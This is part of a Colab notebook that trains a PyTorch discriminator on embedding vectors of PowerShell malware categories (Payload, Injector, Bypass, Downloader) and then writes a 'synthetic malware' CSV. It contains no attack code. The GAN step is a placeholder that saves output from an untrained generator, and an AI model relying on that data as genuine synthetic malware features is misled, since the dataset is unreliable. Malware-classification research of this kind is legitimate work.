pUInD33PnzlVAQIA8PT3Vrl07u+Hm9evXq3r16vLy8lLOnDnVpEkTHTlyJE37unjxYpUuXVr58uVLsmzmzJnq0KGDXn31Vc2aNSvJckdHRzVq1EgLFy5MU5sAkFlcvXpVW7du1aeffqratWvL399flSpV0qBBg/Tiiy9Kkrp27aomTZrYrXfr1i3lzp1bM2fOlHR32lHv3r31/vvvK0eOHPLx8dHw4cNt9QMCAiRJLVq0kMVisd1P9KDPAqvVqtDQUAUGBsrV1VWlS5fWt99+K+nulNjatWtLkp555hlZLBZbELh/KlR8fLwGDBggPz8/OTs7q1ChQrb+J+dBnx+5c+eWj4+PAgMD1bt3bwUGBmr37t12dZo2bcrnB1KNYIFM6fLly/r+++/11ltvydXV1W6Zj4+PXn75ZS1atEj3nk15zJgxKl26tPbs2aMhQ4Yk2ebRo0f10ksvqXnz5vrjjz/Uo0cPu3CSkiNHjmjFihVavXq1Vq9erS1btmj06NG25bGxserXr5927typ8PBwOTg4qEWLFmmamrR161ZVqFAhSfm1a9e0ZMkSvfLKK6pXr56io6O1devWJPUqVaqUbDkA/Bu4ubnJzc1NK1asUHx8fLJ1unXrpvXr1+vs2bO2stWrVysuLk5t27a1lc2ZM0fZs2fXr7/+qs8++0wfffSRNmzYIEn6/fffJUmzZ8/W2bNnbfelh38WhIaG6uuvv9b06dP1119/qW/fvnrllVe0ZcsW+fn52Y6FSxxFmDBhQrL70bFjR33zzTeaOHGiDhw4oC+++EJubm4pPjYpfX7cyzAMrV+/XidOnFDlypXtllWqVEm//fZbio8rcK80X3kbeBocOnRIhmGoaNGiyS4vWrSorly5ogsXLtimLr3wwgt69913bXWOHTtmt84XX3yhwoUL6/PPP5ckFS5cWPv27dOoUaMe2Ber1aqwsDDbUPWrr76q8PBw23qtWrWyqz9r1ix5e3tr//79qT6+4/jx48l+MCxcuFDPPvusihcvLunugXYzZ85UjRo17Or5+vrq5MmTslqtcnDg9wQA/y5ZsmRRWFiYunfvrunTp6tcuXIKDg5Wu3btVKpUKUlStWrVVLhwYc2dO1fvv/++pLsBoXXr1nZfzEuVKqVhw4ZJkp599llNnjxZ4eHhqlevnry9vSVJXl5e8vHxsevDgz4L4uPj9cknn2jjxo2qWrWqJKlgwYLatm2bvvjiCwUHBytHjhyS7o4ipHSSkL///luLFy/Whg0bVLduXdt2HiSlzw9Jyp8/v6S7oyBWq1UfffSRatasaVfH19dXCQkJioqKkr+//wPbAviGgUwtLdd3fNgvNpGRkapYsaJdWaVKlR663YCAALv5r3nz5tX58+dt9w8dOqT27durYMGC8vDwsA2dnzhxItV9v3HjhlxcXJKUz5o1S6+88ort/iuvvKIlS5YkOfOHq6urrFYrvzgB+Ndq1aqVzpw5o1WrVqlBgwbavHmzypUrp7CwMFudbt26afbs2ZKkc+fOad26deratavddhKDSKL739NT8qDPgsOHDysuLk716tWzja64ubnp66+/TtPU2IiICDk6Oio4ODjV66T0+SHdHc2IiIhQRESEvvrqK33yySeaNm2aXZ3EWQFxcXGpbhP/XQQLZEqFChWSxWLRgQMHkl1+4MABPfPMM7ZflyQpe/bsj6UvWbNmtbtvsVjspjk1bdpUly9f1pdffqlff/1Vv/76q6S7B5CnVq5cuXTlyhW7sv379+uXX37R+++/ryxZsihLliyqUqWK4uLiksyHvXz5srJnz55k2hgA/Ju4uLioXr16GjJkiLZv367OnTvbRh+ku9OI/vnnH+3YsUPz5s1TYGBgkhHeh72np+RB612/fl2StGbNGtsX+YiICO3fv992nEVqpOc9PLnPj0SBgYEqVKiQihcvri5duujVV19NMkqfeCKUez9PgZQQLJAp5cyZU/Xq1dPUqVN148YNu2VRUVGaP3++2rZtK4vFkuptFi5cWDt37rQru3f+bHpcunRJkZGR+vDDD1WnTh3bFK20Klu2rPbv329XNnPmTNWsWVN//PGH3QdVv379khzIt2/fPpUtW9bUvgBAZlOsWDHFxsba7ufMmVPNmzfX7NmzFRYWpi5duqR5m1mzZtWdO3fS3A9nZ2edOHFChQoVsrv5+flJkpycnCTpgdsuWbKkrFartmzZkuq2k/v8SImjo2OSz9R9+/Ypf/78ypUrV6rbxH8XwQKZ1uTJkxUfH6+QkBD99NNPOnnypNavX6969eopX758Dz024n49evTQwYMHNWDAANs81sQh9LQElHs988wzypkzp2bMmKHDhw9r06ZN6tevX5q3ExISoh07dtg+cG7duqW5c+eqffv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\n"
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Comparison plot saved as 'dataset_comparison.png'\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Approach with discriminator is build isolated\n",
        "### easy to evalute a power of blockbox discrimitor and enhanced but diffi to load"
      ],
      "metadata": {
        "id": "bNyItGzt9J9Z"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Discriminator"
      ],
      "metadata": {
        "id": "prpwuCGqry-T"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import torch\n",
        "import torch.nn as nn\n",
        "import torch.optim as optim\n",
        "import pandas as pd\n",
        "import numpy as np\n",
        "from sklearn.model_selection import train_test_split\n",
        "from sklearn.preprocessing import StandardScaler, LabelEncoder\n",
        "from sklearn.metrics import accuracy_score\n",
        "\n",
        "# Load and preprocess dataset\n",
        "def load_and_preprocess_data(csv_path, feature_dim=512):\n",
        "    # Load CSV\n",
        "    data = pd.read_csv(csv_path)\n",
        "\n",
        "    # Parse FusionVector (space-separated string to array)\n",
        "    features = np.array([np.fromstring(vec, sep=' ') for vec in data['FusionVector']])\n",
        "\n",
        "    # Validate feature dimension\n",
        "    assert features.shape[1] == feature_dim, f\"Expected {feature_dim} features, got {features.shape[1]}\"\n",
        "\n",
        "    # Encode labels\n",
        "    label_encoder = LabelEncoder()\n",
        "    labels = label_encoder.fit_transform(data['Label'])\n",
        "\n",
        "    # Normalize features\n",
        "    scaler = StandardScaler()\n",
        "    features = scaler.fit_transform(features)\n",
        "\n",
        "    # Convert to PyTorch tensors\n",
        "    features = torch.FloatTensor(features)\n",
        "    labels = torch.LongTensor(labels)\n",
        "\n",
        "    return features, labels, scaler, label_encoder\n",
        "\n",
        "# Discriminator Model\n",
        "class Discriminator(nn.Module):\n",
        "    def __init__(self, input_dim, num_classes=5):  # Assuming 5 classes based on the error\n",
        "        super(Discriminator, self).__init__()\n",
        "        self.model = nn.Sequential(\n",
        "            nn.Linear(input_dim, 256),\n",
        "            nn.LeakyReLU(0.2),\n",
        "            nn.Dropout(0.3),\n",
        "            nn.Linear(256, 128),\n",
        "            nn.LeakyReLU(0.2),\n",
        "            nn.Dropout(0.3),\n",
        "            nn.Linear(128, num_classes)  # Output layer for num_classes\n",
        "        )\n",
        "\n",
        "    def forward(self, x):\n",
        "        return self.model(x)\n",
        "\n",
        "# Train and evaluate discriminator\n",
        "def train_discriminator(discriminator, features, labels, test_size=0.2, epochs=50, batch_size=64, lr=0.0002):\n",
        "    # Split data\n",
        "    X_train, X_test, y_train, y_test = train_test_split(\n",
        "        features, labels, test_size=test_size, stratify=labels, random_state=42\n",
        "    )\n",
        "\n",
        "    # Optimizer and loss\n",
        "    optimizer = optim.Adam(discriminator.parameters(), lr=lr, betas=(0.5, 0.999))\n",
        "    class_loss = nn.CrossEntropyLoss()\n",
        "\n",
        "    # Training loop\n",
        "    discriminator.train()\n",
        "    for epoch in range(epochs):\n",
        "        total_loss = 0  # To accumulate loss for the epoch\n",
        "        num_batches = 0  # To count batches for averaging loss\n",
        "\n",
        "        for i in range(0, len(X_train), batch_size):\n",
        "            batch_features = X_train[i:i+batch_size]\n",
        "            batch_labels = y_train[i:i+batch_size]\n",
        "\n",
        "            optimizer.zero_grad()\n",
        "            outputs = discriminator(batch_features)\n",
        "\n",
        "            # Check if any label is out of bounds and adjust if necessary\n",
        "            # This step handles potential issues with the dataset\n",
        "            invalid_labels = (batch_labels >= discriminator.model[-1].out_features).nonzero()\n",
        "            if invalid_labels.nelement() > 0:\n",
        "                # Print or handle invalid labels (e.g., replace with max valid label)\n",
        "                print(f\"Warning: Invalid labels found in batch: {batch_labels[invalid_labels]}\")\n",
        "                batch_labels[invalid_labels] = discriminator.model[-1].out_features - 1\n",
        "\n",
        "            loss = class_loss(outputs, batch_labels)\n",
        "            loss.backward()\n",
        "            optimizer.step()\n",
        "\n",
        "            total_loss += loss.item()  # Accumulate loss\n",
        "            num_batches += 1  # Increment batch count\n",
        "\n",
        "        if (epoch + 1) % 10 == 0:\n",
        "            avg_loss = total_loss / num_batches  # Calculate average loss\n",
        "            print(f\"Epoch {epoch+1}/{epochs}, Average Loss: {avg_loss:.4f}\")\n",
        "\n",
        "    # Evaluate\n",
        "    discriminator.eval()\n",
        "    with torch.no_grad():\n",
        "        test_outputs = discriminator(X_test)\n",
        "        test_preds = torch.argmax(test_outputs, dim=1)\n",
        "        accuracy = accuracy_score(y_test.numpy(), test_preds.numpy())\n",
        "\n",
        "    print(f\"Discriminator Test Accuracy: {accuracy:.4f}\")\n",
        "    return accuracy, X_train, y_train, X_test, y_test, scaler, label_encoder\n",
        "\n",
        "# Main execution\n",
        "if __name__ == \"__main__\":\n",
        "    # Hyperparameters\n",
        "    feature_dim = 512  # From dataset\n",
        "    batch_size = 64\n",
        "    epochs = 50\n",
        "    accuracy_threshold = 0.7  # Adjust as needed\n",
        "\n",
        "    # Load dataset (replace with your CSV path)\n",
        "    csv_path = \"/content/drive/MyDrive/GAN/fusion_with_vector_extended.csv\"  # Placeholder\n",
        "    features, labels, scaler, label_encoder = load_and_preprocess_data(csv_path, feature_dim)\n",
        "\n",
        "    # Initialize discriminator\n",
        "    discriminator = Discriminator(feature_dim)\n",
        "\n",
        "    # Train and evaluate\n",
        "    accuracy, X_train, y_train, X_test, y_test, scaler, label_encoder = train_discriminator(\n",
        "        discriminator, features, labels, epochs=epochs, batch_size=batch_size\n",
        "    )\n",
        "\n",
        "    # Save model if satisfactory\n",
        "    if accuracy >= accuracy_threshold:\n",
        "        torch.save(discriminator.state_dict(), \"discriminator_model.pth\")\n",
        "        print(\"Discriminator model saved as 'discriminator_model.pth'\")\n",
        "        # Save scaler and label encoder for GAN\n",
        "        np.save(\"scaler_params.npy\", [scaler.mean_, scaler.scale_])\n",
        "        np.save(\"label_encoder_classes.npy\", label_encoder.classes_)\n",
        "        print(\"Scaler and label encoder saved\")\n",
        "    else:\n",
        "        print(\"Discriminator accuracy below threshold. Adjust model or hyperparameters.\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "_gotF-Sgr2lz",
        "outputId": "dffa6e78-7c20-437e-a3d2-b3f5646720eb"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Warning: Invalid labels found in batch: tensor([[5]])\n",
            "Warning: Invalid labels found in batch: tensor([[5]])\n",
            "Epoch 10/50, Average Loss: 0.1484\n",
            "Epoch 20/50, Average Loss: 0.0847\n",
            "Epoch 30/50, Average Loss: 0.0594\n",
            "Epoch 40/50, Average Loss: 0.0459\n",
            "Epoch 50/50, Average Loss: 0.0364\n",
            "Discriminator Test Accuracy: 0.9720\n",
            "Discriminator model saved as 'discriminator_model.pth'\n",
            "Scaler and label encoder saved\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "## GAN with built-in generator\n"
      ],
      "metadata": {
        "id": "BVH0ptYqr_1f"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import torch\n",
        "import torch.nn as nn\n",
        "import torch.optim as optim\n",
        "import pandas as pd\n",
        "import numpy as np\n",
        "from sklearn.preprocessing import StandardScaler\n",
        "\n",
        "# Load and preprocess dataset\n",
        "def load_and_preprocess_data(csv_path, scaler_params, feature_dim=512):\n",
        "    # Load CSV\n",
        "    data = pd.read_csv(csv_path)\n",
        "\n",
        "    # Parse FusionVector\n",
        "    features = np.array([np.fromstring(vec, sep=' ') for vec in data['FusionVector']])\n",
        "\n",
        "    # Validate feature dimension\n",
        "    assert features.shape[1] == feature_dim, f\"Expected {feature_dim} features, got {features.shape[1]}\"\n",
        "\n",
        "    # Load labels (assume same encoding as discriminator)\n",
        "    label_encoder_classes = np.load(\"label_encoder_classes.npy\", allow_pickle=True)\n",
        "    label_map = {cls: idx for idx, cls in enumerate(label_encoder_classes)}\n",
        "\n",
        "    # Handle NaN values in 'Label' column\n",
        "    # Replace NaN with a placeholder string or a valid label\n",
        "    data['Label'].fillna('unknown', inplace=True) # Replace NaN with 'unknown'\n",
        "\n",
        "    labels = np.array([label_map.get(lbl, -1) for lbl in data['Label']])\n",
        "    # Use get with a default value for unknown labels\n",
        "    # -1 could represent an unknown label, adjust as needed\n",
        "\n",
        "    # Normalize features using saved scaler\n",
        "    scaler = StandardScaler()\n",
        "    scaler.mean_, scaler.scale_ = scaler_params[0], scaler_params[1]\n",
        "    features = scaler.transform(features)\n",
        "\n",
        "    # Convert to PyTorch tensors\n",
        "    features = torch.FloatTensor(features)\n",
        "    labels = torch.LongTensor(labels)\n",
        "\n",
        "    return features, labels, scaler\n",
        "\n",
        "# Discriminator Model (with real/fake output)\n",
        "\n",
        "# class Discriminator(nn.Module):\n",
        "#     def __init__(self, input_dim, num_classes=5):\n",
        "#         super(Discriminator, self).__init__()\n",
        "#         self.model = nn.Sequential(\n",
        "#             nn.Linear(input_dim, 256),\n",
        "#             nn.LeakyReLU(0.2),\n",
        "#             nn.Dropout(0.3),\n",
        "#             nn.Linear(256, 128),\n",
        "#             nn.LeakyReLU(0.2),\n",
        "#             nn.Dropout(0.3), # Added back the missing Dropout layer\n",
        "#             nn.Linear(128, num_classes)  # Added back the output layer for num_classes\n",
        "#         )\n",
        "\n",
        "#     def forward(self, x):\n",
        "#         return self.model(x)\n",
        "class Discriminator(nn.Module):\n",
        "    def __init__(self, input_dim, num_classes=5):  # Assuming 5 classes based on the error\n",
        "        super(Discriminator, self).__init__()\n",
        "        self.model = nn.Sequential(\n",
        "            nn.Linear(input_dim, 256),\n",
        "            nn.LeakyReLU(0.2),\n",
        "            nn.Dropout(0.3),\n",
        "            nn.Linear(256, 128),\n",
        "            nn.LeakyReLU(0.2),\n",
        "            nn.Dropout(0.3),\n",
        "            nn.Linear(128, num_classes)  # Output layer for num_classes\n",
        "        )\n",
        "\n",
        "    def forward(self, x):\n",
        "        return self.model(x)\n",
        "\n",
        "\n",
        "class Generator(nn.Module): # Added Generator class\n",
        "    def __init__(self, noise_dim, output_dim):\n",
        "        super(Generator, self).__init__()\n",
        "        self.model = nn.Sequential(\n",
        "            nn.Linear(noise_dim, 128),\n",
        "            nn.ReLU(),\n",
        "            nn.Linear(128, 256),\n",
        "            nn.ReLU(),\n",
        "            nn.Linear(256, output_dim)\n",
        "        )\n",
        "\n",
        "    def forward(self, x):\n",
        "        return self.model(x)\n",
        "\n",
        "def train_gan(discriminator, generator, features, labels, noise_dim=100, epochs=200, batch_size=64): # Added train_gan function\n",
        "    # Placeholder - replace with actual GAN training logic\n",
        "\n",
        "    # Generate synthetic dataset\n",
        "    num_samples = len(features)\n",
        "    noise = torch.randn(num_samples, noise_dim)\n",
        "    synthetic_data = generator(noise).detach().numpy()\n",
        "    synthetic_data = scaler.inverse_transform(synthetic_data)\n",
        "\n",
        "    # Random labels for synthetic data\n",
        "    synthetic_labels = np.random.randint(0, 5, num_samples)\n",
        "    synthetic_labels = label_encoder_classes[synthetic_labels]\n",
        "\n",
        "    # Create synthetic dataset\n",
        "    synthetic_df = pd.DataFrame(\n",
        "        synthetic_data,\n",
        "        columns=[f\"feature_{i+1}\" for i in range(synthetic_data.shape[1])]\n",
        "    )\n",
        "    synthetic_df['Label'] = synthetic_labels\n",
        "    synthetic_df['Full Payload'] = ''  # Dummy column\n",
        "\n",
        "    return synthetic_df\n",
        "\n",
        "# Main execution\n",
        "if __name__ == \"__main__\":\n",
        "    # Hyperparameters\n",
        "    feature_dim = 512\n",
        "    noise_dim = 100\n",
        "    batch_size = 64\n",
        "    epochs = 200\n",
        "\n",
        "    # Load dataset and scaler\n",
        "    csv_path = \"/content/drive/MyDrive/GAN/fusion_with_vector_extended.csv\"  # Placeholder\n",
        "    scaler_params = np.load(\"scaler_params.npy\", allow_pickle=True)\n",
        "    features, labels, scaler = load_and_preprocess_data(csv_path, scaler_params, feature_dim)\n",
        "\n",
        "    label_encoder_classes = np.load(\"label_encoder_classes.npy\", allow_pickle=True) #Load label encoder classes\n",
        "\n",
        "    # Load discriminator\n",
        "    discriminator = Discriminator(feature_dim)\n",
        "    discriminator.load_state_dict(torch.load(\"discriminator_model.pth\"))\n",
        "    discriminator.eval()  # Freeze discriminator weights\n",
        "\n",
        "    # Initialize generator\n",
        "    generator = Generator(noise_dim, feature_dim)\n",
        "\n",
        "    # Train GAN\n",
        "    synthetic_df = train_gan(discriminator, generator, features, labels, noise_dim=noise_dim, epochs=epochs, batch_size=batch_size)\n",
        "\n",
        "    # Save synthetic dataset\n",
        "    synthetic_df.to_csv(\"synthetic_powershell_malware.csv\", index=False)\n",
        "    print(\"Synthetic dataset saved as 'synthetic_powershell_malware.csv'\")\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "4L2g3R8hsEZY",
        "outputId": "cbfd4f3c-ce49-4b13-f7ad-f6254ce3d377"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "<ipython-input-18-3cd1bd604ae0>:25: FutureWarning: A value is trying to be set on a copy of a DataFrame or Series through chained assignment using an inplace method.\n",
            "The behavior will change in pandas 3.0. This inplace method will never work because the intermediate object on which we are setting values always behaves as a copy.\n",
            "\n",
            "For example, when doing 'df[col].method(value, inplace=True)', try using 'df.method({col: value}, inplace=True)' or df[col] = df[col].method(value) instead, to perform the operation inplace on the original object.\n",
            "\n",
            "\n",
            "  data['Label'].fillna('unknown', inplace=True) # Replace NaN with 'unknown'\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Synthetic dataset saved as 'synthetic_powershell_malware.csv'\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# prompt: load dataset and head(), synthetic_powershell_malware.csv\n",
        "\n",
        "import pandas as pd\n",
        "\n",
        "# Assuming 'synthetic_powershell_malware.csv' is in your current working directory\n",
        "# If not, provide the correct file path\n",
        "try:\n",
        "    df = pd.read_csv('synthetic_powershell_malware.csv')\n",
        "    print(df.head())\n",
        "except FileNotFoundError:\n",
        "    print(\"Error: 'synthetic_powershell_malware.csv' not found. Please check the file path.\")\n",
        "except Exception as e:\n",
        "    print(f\"An error occurred: {e}\")\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "sdHOj2IKv5wJ",
        "outputId": "a00fcf7b-39a8-4e1b-ffdb-8a1bc080ed1a"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "   feature_1  feature_2  feature_3  feature_4  feature_5  feature_6  \\\n",
            "0  -0.321576  -0.392932  -0.688882  -0.094042  -0.483731  -0.504745   \n",
            "1  -0.353613  -0.373304  -0.702172  -0.131831  -0.478514  -0.470979   \n",
            "2  -0.309641  -0.398533  -0.711898  -0.124499  -0.440564  -0.544499   \n",
            "3  -0.308181  -0.424315  -0.695093  -0.100583  -0.472719  -0.506917   \n",
            "4  -0.324091  -0.377408  -0.720342  -0.095734  -0.451657  -0.552422   \n",
            "\n",
            "   feature_7  feature_8  feature_9  feature_10  ...  feature_505  feature_506  \\\n",
            "0  -0.149790  -0.184425   0.473055   -0.256498  ...     0.147626    -0.378020   \n",
            "1  -0.135763  -0.179018   0.432259   -0.270265  ...     0.116773    -0.382627   \n",
            "2  -0.139711  -0.167192   0.444204   -0.272017  ...     0.167514    -0.368123   \n",
            "3  -0.144950  -0.193542   0.482494   -0.276501  ...     0.169986    -0.399970   \n",
            "4  -0.138363  -0.164719   0.469896   -0.290826  ...     0.123359    -0.398386   \n",
            "\n",
            "   feature_507  feature_508  feature_509  feature_510  feature_511  \\\n",
            "0    -0.487029    -0.090935    -0.369447    -0.217714     0.428829   \n",
            "1    -0.468468    -0.106100    -0.311979    -0.304157     0.440679   \n",
            "2    -0.433098    -0.106133    -0.363632    -0.329394     0.412675   \n",
            "3    -0.396030    -0.100046    -0.352146    -0.256456     0.415938   \n",
            "4    -0.463606    -0.111623    -0.300661    -0.230816     0.429886   \n",
            "\n",
            "   feature_512          Label  Full Payload  \n",
            "0     0.077812        Payload           NaN  \n",
            "1     0.151620       Injector           NaN  \n",
            "2     0.190609  TaskExecution           NaN  \n",
            "3     0.095038         Bypass           NaN  \n",
            "4     0.170146     Downloader           NaN  \n",
            "\n",
            "[5 rows x 514 columns]\n"
          ]
        }
      ]
    }
  ]
}